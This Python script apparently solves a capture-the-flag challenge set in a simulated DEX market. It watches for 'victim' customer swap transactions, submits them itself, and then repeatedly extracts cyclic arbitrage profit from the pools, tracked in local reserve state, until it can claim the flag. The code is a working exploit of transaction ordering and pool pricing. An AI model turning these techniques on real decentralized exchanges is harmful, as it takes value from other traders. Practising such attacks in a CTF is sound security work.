#!/usr/bin/env python3
import argparse
import json
import queue
import re
import sys
import time
from urllib.parse import urljoin

import requests
import socketio
from eth_account import Account
from eth_account.typed_transactions import TypedTransaction
from eth_account._utils.legacy_transactions import Transaction
from eth_abi import decode as abi_decode
from hexbytes import HexBytes
from web3 import Web3

ERC_ABI = [
    {"type": "function", "name": "approve", "stateMutability": "nonpayable", "inputs": [{"name": "spender", "type": "address"}, {"name": "value", "type": "uint256"}], "outputs": [{"name": "", "type": "bool"}]},
]

DEX_ABI = [
    {"type": "function", "name": "TOKEN_A", "stateMutability": "view", "inputs": [], "outputs": [{"name": "", "type": "address"}]},
    {"type": "function", "name": "TOKEN_B", "stateMutability": "view", "inputs": [], "outputs": [{"name": "", "type": "address"}]},
    {"type": "function", "name": "getReserves", "stateMutability": "view", "inputs": [], "outputs": [{"name": "", "type": "uint256"}, {"name": "", "type": "uint256"}]},
    {"type": "function", "name": "swap", "stateMutability": "nonpayable", "inputs": [{"name": "inputAmount", "type": "uint256"}, {"name": "inputToken", "type": "address"}, {"name": "deadline", "type": "uint256"}], "outputs": []},
]

TOKENS = ("APL", "BAN", "CHY")
PAIR_NAME = {
    ("APL", "BAN"): "APL-BAN",
    ("BAN", "APL"): "APL-BAN",
    ("APL", "CHY"): "APL-CHY",
    ("CHY", "APL"): "APL-CHY",
    ("BAN", "CHY"): "BAN-CHY",
    ("CHY", "BAN"): "BAN-CHY",
}
APL_CYCLES = [
    ("APL", "BAN", "CHY", "APL"),
    ("APL", "CHY", "BAN", "APL"),
]
INITIAL_RESERVES = {
    "APL-BAN": {"APL": 100, "BAN": 200},
    "APL-CHY": {"APL": 100, "CHY": 400},
    "BAN-CHY": {"BAN": 100, "CHY": 200},
}
APPROVALS_NEEDED = [
    ("APL", "APL-BAN"),
    ("BAN", "APL-BAN"),
    ("APL", "APL-CHY"),
    ("CHY", "APL-CHY"),
    ("BAN", "BAN-CHY"),
    ("CHY", "BAN-CHY"),
]
GET_RESERVES_SIG = "0x" + Web3.keccak(text="getReserves()")[:4].hex()


def norm_base(base: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "http://" + base
    return base.rstrip("/") + "/"


def cp(addr):
    return Web3.to_checksum_address(addr)


def amount_out(res_in, res_out, amount_in):
    if amount_in <= 0:
        return 0
    return res_out - (res_in * res_out) // (res_in + amount_in)


def decode_raw_tx(raw_hex):
    hb = HexBytes(raw_hex)
    if hb[0] <= 0x7F:
        tx = TypedTransaction.from_bytes(hb).as_dict()
    else:
        tx = Transaction.from_bytes(hb).as_dict()
    to = tx.get("to")
    if isinstance(to, (bytes, bytearray, HexBytes)):
        tx["to"] = Web3.to_checksum_address("0x" + bytes(to).hex()) if len(to) else None
    elif isinstance(to, str) and to:
        tx["to"] = Web3.to_checksum_address(to)
    data = tx.get("data", b"")
    if isinstance(data, str):
        tx["data"] = HexBytes(data)
    return tx


def rawtx_hash(rawtx: str) -> str:
    return Web3.keccak(HexBytes(rawtx)).hex()


class Solver:
    def __init__(self, base, verbose=True):
        self.base = norm_base(base)
        self.verbose = verbose
        self.session = requests.Session()
        self.codec = Web3()
        self.chain_id = 31337
        self.gas_price = 1
        self.account = Account.create()
        self.nonce = 0
        self.rpc_id = 1
        self.setup = None
        self.erc = {}
        self.dex = {}
        self.token_addr_to_sym = {}
        self.dex_tokens = {}
        self.reserves = {pair: vals.copy() for pair, vals in INITIAL_RESERVES.items()}
        self.balances = {"APL": 0, "BAN": 0, "CHY": 0}
        self.q = queue.Queue()
        self.sio = socketio.Client(reconnection=True, logger=False, engineio_logger=False, request_timeout=6)

        @self.sio.on("new_trade")
        def on_new_trade(data):
            self.q.put((time.time(), data))

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    def rpc(self, method, params):
        body = {"jsonrpc": "2.0", "id": self.rpc_id, "method": method, "params": params}
        self.rpc_id += 1
        r = self.session.post(self.base, json=body, timeout=4)
        if r.status_code != 200:
            raise RuntimeError(f"rpc {method} http {r.status_code}: {r.text[:200]}")
        j = r.json()
        if "error" in j and j["error"]:
            raise RuntimeError(f"rpc {method} error: {j['error']}")
        return j["result"]

    def wait_receipt_status(self, txh, timeout=2.0):
        if not txh.startswith("0x"):
            txh = "0x" + txh
        deadline = time.time() + timeout
        last_err = None
        while time.time() < deadline:
            try:
                receipt = self.rpc("eth_getTransactionReceipt", [txh])
            except Exception as e:
                last_err = e
                time.sleep(0.01)
                continue
            if receipt is None:
                time.sleep(0.01)
                continue
            return int(receipt["status"], 16) == 1
        return None

    def submit_raw(self, rawtx, label="tx", wait=True, receipt_timeout=2.0, tolerate_400=False, known_hash=None):
        txh = known_hash or rawtx_hash(rawtx)
        r = self.session.post(urljoin(self.base, "submit"), data={"rawtx": rawtx}, timeout=5)
        if r.status_code == 200:
            txh = r.json().get("tx_hash", txh)
        elif not (tolerate_400 and r.status_code == 400):
            raise RuntimeError(f"{label}: submit failed {r.status_code}: {r.text[:300]}")
        if not wait:
            return txh
        status = self.wait_receipt_status(txh, receipt_timeout)
        if status is not True:
            raise RuntimeError(f"{label}: tx reverted or not mined: {txh}")
        return txh

    def build_tx(self, to, data, gas):
        tx = {
            "to": cp(to),
            "from": self.account.address,
            "nonce": self.nonce,
            "gas": int(gas),
            "gasPrice": int(self.gas_price),
            "chainId": int(self.chain_id),
            "data": data,
            "value": 0,
        }
        self.nonce += 1
        return self.account.sign_transaction(tx).raw_transaction.hex()

    def setup_contracts(self):
        r = self.session.get(urljoin(self.base, "setup"), timeout=5)
        r.raise_for_status()
        self.setup = r.json()
        try:
            self.chain_id = int(self.rpc("eth_chainId", []), 16)
        except Exception:
            self.chain_id = 31337
        try:
            self.gas_price = max(int(self.rpc("eth_gasPrice", []), 16), 1)
        except Exception:
            self.gas_price = 1
        for sym, addr in self.setup["ercs"].items():
            chk = cp(addr)
            self.erc[sym] = self.codec.eth.contract(address=chk, abi=ERC_ABI)
            self.token_addr_to_sym[chk] = sym
        for name, addr in self.setup["dexes"].items():
            chk = cp(addr)
            c = self.codec.eth.contract(address=chk, abi=DEX_ABI)
            self.dex[name] = c
        self.dex_tokens = {
            cp(self.setup["dexes"]["APL-BAN"]): (cp(self.setup["ercs"]["APL"]), cp(self.setup["ercs"]["BAN"]), "APL-BAN"),
            cp(self.setup["dexes"]["APL-CHY"]): (cp(self.setup["ercs"]["APL"]), cp(self.setup["ercs"]["CHY"]), "APL-CHY"),
            cp(self.setup["dexes"]["BAN-CHY"]): (cp(self.setup["ercs"]["BAN"]), cp(self.setup["ercs"]["CHY"]), "BAN-CHY"),
        }
        self.log(f"[+] chain_id={self.chain_id}")
        self.log(f"[+] manager={self.account.address}")
        self.log(f"[+] ercs={self.setup['ercs']}")
        self.log(f"[+] dexes={self.setup['dexes']}")

    def try_sync_reserves(self):
        synced = {}
        for pair, c in self.dex.items():
            ret = self.rpc("eth_call", [{"to": c.address, "data": GET_RESERVES_SIG}, "latest"])
            data = HexBytes(ret)
            a, b = abi_decode(["uint256", "uint256"], data)
            if pair == "APL-BAN":
                synced[pair] = {"APL": int(a), "BAN": int(b)}
            elif pair == "APL-CHY":
                synced[pair] = {"APL": int(a), "CHY": int(b)}
            elif pair == "BAN-CHY":
                synced[pair] = {"BAN": int(a), "CHY": int(b)}
        self.reserves = synced
        self.log(f"[+] synced reserves from chain: {self.reserves}")

    def claim_basket(self):
        r = self.session.post(urljoin(self.base, "fruit-basket"), data={"address": self.account.address}, timeout=5)
        if r.status_code == 200:
            self.balances = {"APL": 10, "BAN": 0, "CHY": 0}
            self.log(f"[+] claimed fruit basket: {self.balances}")
            return
        if r.status_code == 403 and "already claimed" in r.text.lower():
            br = self.session.get(urljoin(self.base, f"balance/{self.account.address}"), timeout=5)
            if br.status_code == 200:
                self.balances = {k: int(v) for k, v in br.json().items()}
            self.log(f"[!] /fruit-basket already claimed; balances={self.balances}")
            if sum(self.balances.values()) == 0:
                raise RuntimeError("instance already claimed by another account; reset instance and run again")
            return
        raise RuntimeError(f"fruit-basket failed {r.status_code}: {r.text}")

    def preapprove(self):
        max_uint = (1 << 256) - 1
        self.log("[+] pre-approving only required token/dex pairs")
        for sym, dex_name in APPROVALS_NEEDED:
            data = self.erc[sym].functions.approve(self.dex[dex_name].address, max_uint)._encode_transaction_data()
            raw = self.build_tx(self.erc[sym].address, data, 100_000)
            self.submit_raw(raw, f"approve {sym}->{dex_name}", wait=True, receipt_timeout=2)
        self.log("[+] approvals done")

    def connect_socket(self):
        errors = []
        for transports in (["websocket"], ["polling"], None):
            try:
                if transports is None:
                    self.sio.connect(self.base)
                else:
                    self.sio.connect(self.base, transports=transports)
                self.log(f"[+] socket transport={self.sio.transport()}")
                return
            except Exception as e:
                errors.append(f"{transports or 'default'}: {e}")
                try:
                    self.sio.disconnect()
                except Exception:
                    pass
        raise RuntimeError("socket connect failed: " + " | ".join(errors))

    def symbol_of(self, token_addr):
        return self.token_addr_to_sym.get(cp(token_addr), cp(token_addr))

    def decode_swap(self, rawtx):
        tx = decode_raw_tx(rawtx)
        to = cp(tx["to"])
        if to not in self.dex_tokens:
            return None
        c = self.dex[self.dex_tokens[to][2]]
        fn, args = c.decode_function_input(tx["data"])
        if fn.fn_name != "swap":
            return None
        input_token = cp(args["inputToken"])
        input_amount = int(args["inputAmount"])
        deadline = int(args["deadline"])
        token_a, token_b, dex_name = self.dex_tokens[to]
        output_token = token_b if input_token == token_a else token_a
        return {
            "dex_addr": to,
            "dex_name": dex_name,
            "contract": c,
            "input_token": input_token,
            "output_token": output_token,
            "input_amount": input_amount,
            "deadline": deadline,
        }

    def pool_out(self, pair, token_in, amount_in):
        pool = self.reserves[pair]
        tokens = list(pool.keys())
        token_out = tokens[1] if tokens[0] == token_in else tokens[0]
        out_amt = amount_out(pool[token_in], pool[token_out], amount_in)
        return token_out, out_amt

    def apply_swap_local(self, pair, token_in, amount_in):
        token_out, out_amt = self.pool_out(pair, token_in, amount_in)
        pool = self.reserves[pair]
        pool[token_in] += int(amount_in)
        pool[token_out] -= int(out_amt)
        return token_out, int(out_amt)

    def simulate_path(self, path, amount_in):
        if amount_in <= 0:
            return 0
        state = {pair: vals.copy() for pair, vals in self.reserves.items()}
        cur = int(amount_in)
        for a, b in zip(path, path[1:]):
            pair = PAIR_NAME[(a, b)]
            pool = state[pair]
            out_amt = amount_out(pool[a], pool[b], cur)
            if out_amt <= 0:
                return 0
            pool[a] += cur
            pool[b] -= out_amt
            cur = out_amt
        return cur

    def best_apl_cycle(self):
        apl_bal = self.balances["APL"]
        best_profit = 0
        best_path = None
        best_amount = 0
        best_output = 0
        if apl_bal <= 0:
            return best_profit, best_path, best_amount, best_output
        for path in APL_CYCLES:
            for amount in range(1, apl_bal + 1):
                output = self.simulate_path(path, amount)
                profit = output - amount
                if profit > best_profit:
                    best_profit = profit
                    best_path = path
                    best_amount = amount
                    best_output = output
        return best_profit, best_path, best_amount, best_output

    def swap_raw(self, dex_name, amount, input_sym, deadline=None):
        if deadline is None:
            deadline = int(time.time()) + 60
        data = self.dex[dex_name].functions.swap(int(amount), self.erc[input_sym].address, int(deadline))._encode_transaction_data()
        return self.build_tx(self.dex[dex_name].address, data, 220_000)

    def get_batch(self, timeout=20, cap=8):
        first = self.q.get(timeout=timeout)
        batch = [first]
        while len(batch) < cap:
            try:
                batch.append(self.q.get_nowait())
            except queue.Empty:
                break
        return batch

    def process_victim_batch(self, batch, idx):
        submitted = []
        now = int(time.time())
        for _, data in batch:
            info = self.decode_swap(data["swap"])
            if info is None:
                continue
            inp_sym = self.symbol_of(info["input_token"])
            out_sym = self.symbol_of(info["output_token"])
            ttl = info["deadline"] - now
            # We still try ttl 0/1 to keep traders alive; only discard clearly expired bundles.
            if ttl < -1:
                self.log(f"[{idx}] skip clearly expired victim trade {info['dex_name']} ttl={ttl}s")
                continue
            self.log(f"[{idx}] victim {info['dex_name']}: {info['input_amount']} {inp_sym}->{out_sym}, ttl={ttl}s")
            self.submit_raw(data["approve"], f"victim approve {idx}", wait=False, tolerate_400=True)
            swap_hash = data.get("swap_hash") or rawtx_hash(data["swap"])
            self.submit_raw(data["swap"], f"victim swap {idx}", wait=False, tolerate_400=True, known_hash=swap_hash)
            submitted.append((swap_hash, info, ttl))
            now = int(time.time())

        success = 0
        for swap_hash, info, ttl in submitted:
            status = self.wait_receipt_status(swap_hash, timeout=max(0.4, min(2.5, ttl + 1.0)))
            if status is True:
                inp_sym = self.symbol_of(info["input_token"])
                self.apply_swap_local(info["dex_name"], inp_sym, info["input_amount"])
                success += 1
            else:
                raise RuntimeError(f"victim swap not confirmed: {swap_hash}")
        return success

    def execute_round(self, path, amount, idx, round_no):
        cur = int(amount)
        sent = []
        predicted_last = 0
        for hop, (a, b) in enumerate(zip(path, path[1:]), 1):
            pair = PAIR_NAME[(a, b)]
            out_sym, out_amt = self.apply_swap_local(pair, a, cur)
            assert out_sym == b
            self.balances[a] -= cur
            self.balances[b] += out_amt
            self.log(f"[{idx}] arb#{round_no}.{hop}: {cur} {a} -> {b} via {pair}")
            raw = self.swap_raw(pair, cur, a)
            txh = self.submit_raw(raw, f"arb {idx} {round_no}.{hop} {a}->{b}", wait=False)
            sent.append((txh, f"arb {idx} {round_no}.{hop} {a}->{b}"))
            cur = out_amt
            predicted_last = out_amt
        status = self.wait_receipt_status(sent[-1][0], timeout=2.5)
        if status is not True:
            raise RuntimeError(f"{sent[-1][1]} not confirmed")
        return predicted_last

    def drain_arbitrage(self, idx, soft_round_cap=2, hard_round_cap=10):
        round_no = 0
        while round_no < hard_round_cap:
            profit, path, amount, output = self.best_apl_cycle()
            if profit <= 0 or not path:
                return
            queue_busy = not self.q.empty()
            cutoff = 1 if self.balances["APL"] >= 450 else (6 if queue_busy else 3)
            if profit < cutoff:
                return
            round_no += 1
            self.log(f"[{idx}] best arb round {round_no}: path={'->'.join(path)} amount={amount} expected_profit={profit} expected_out={output}")
            start_apl = self.balances["APL"]
            end_apl = self.execute_round(path, amount, idx, round_no)
            total_apl = self.balances["APL"]
            self.log(f"[{idx}] arb round {round_no} done: start_apl={start_apl} total_apl={total_apl} last_hop_out={end_apl}")
            if total_apl >= 500:
                return
            # If new victim work is waiting, stop after a small number of rounds.
            if not self.q.empty() and round_no >= soft_round_cap:
                return

    def maybe_resync_balance(self):
        r = self.session.get(urljoin(self.base, f"balance/{self.account.address}"), timeout=4)
        if r.status_code == 200:
            self.balances = {k: int(v) for k, v in r.json().items()}

    def run(self, max_trades=400):
        self.setup_contracts()
        self.claim_basket()
        self.preapprove()
        self.connect_socket()

        r = self.session.get(urljoin(self.base, "open"), timeout=5)
        if r.status_code not in (200, 400):
            raise RuntimeError(f"open failed {r.status_code}: {r.text}")
        if r.status_code == 400:
            self.log("[!] market already running; syncing reserves from chain before continuing")
            self.try_sync_reserves()
        self.log("[+] market opened; listening for customer swaps")

        idle_windows = 0
        for idx in range(1, max_trades + 1):
            if self.balances["APL"] >= 500:
                break
            try:
                batch = self.get_batch(timeout=20, cap=8)
                if len(batch) > 1:
                    self.log(f"[+] processing batch of {len(batch)} victim trade(s)")
                idle_windows = 0
            except queue.Empty:
                idle_windows += 1
                self.log(f"[!] idle window {idle_windows}: no trade received")
                # During idle periods, squeeze remaining arb harder.
                try:
                    self.drain_arbitrage(idx, soft_round_cap=6, hard_round_cap=20)
                except Exception as e:
                    self.log(f"[!] idle arbitrage error: {e}")
                    try:
                        self.try_sync_reserves()
                    except Exception:
                        pass
                    try:
                        self.maybe_resync_balance()
                    except Exception:
                        pass
                if idle_windows >= 6:
                    break
                continue

            try:
                ok = self.process_victim_batch(batch, idx)
                if ok:
                    self.drain_arbitrage(idx, soft_round_cap=2, hard_round_cap=10)
            except Exception as e:
                self.log(f"[{idx}] trade handling failed: {e}")
                try:
                    self.try_sync_reserves()
                except Exception as e2:
                    self.log(f"[!] reserve resync failed: {e2}")
                try:
                    self.maybe_resync_balance()
                except Exception:
                    pass
                continue

            if idx % 2 == 0 or self.balances["APL"] >= 500:
                try:
                    self.maybe_resync_balance()
                except Exception:
                    pass
            self.log(f"[{idx}] balances now: {self.balances}")

        flag_resp = self.session.get(urljoin(self.base, "flag"), timeout=5)
        self.log(f"[+] /flag status={flag_resp.status_code}")
        print(flag_resp.text)

        m = re.search(r"GPNCTF\{[^}\n]+\}", flag_resp.text)
        if m:
            print(f"[+] extracted flag: {m.group(0)}")
            return
        if "dummy_flag" in flag_resp.text:
            print("[+] local dummy flag reached")
            return

        print(f"[-] no flag yet; final balances={json.dumps(self.balances)}")
        sys.exit(2)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base", help="http(s) base URL")
    ap.add_argument("--max-trades", type=int, default=400)
    args = ap.parse_args()
    Solver(args.base).run(args.max_trades)


if __name__ == "__main__":
    main()
